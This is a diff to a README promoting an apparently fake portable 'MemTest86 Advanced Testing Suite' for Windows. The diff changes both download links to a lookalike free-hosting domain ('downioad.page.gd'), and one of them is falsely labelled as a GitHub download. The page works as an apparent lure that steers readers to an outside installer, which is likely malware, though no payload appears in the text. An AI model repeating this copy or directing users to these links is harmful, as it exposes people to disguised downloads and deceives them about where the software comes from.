@@ -2,7 +2,7 @@
 
 MemTest86 Advanced Testing Suite is a comprehensive Windows utility built to streamline and enhance your memory testing workflow. This portable edition delivers automated RAM diagnostics with rich reporting capabilities, making it an indispensable tool for system administrators and PC enthusiasts who demand thorough memory validation with minimal effort.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -66,7 +66,7 @@ A: Use the built-in updater under **Help > Check for Updates**, or return to the
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
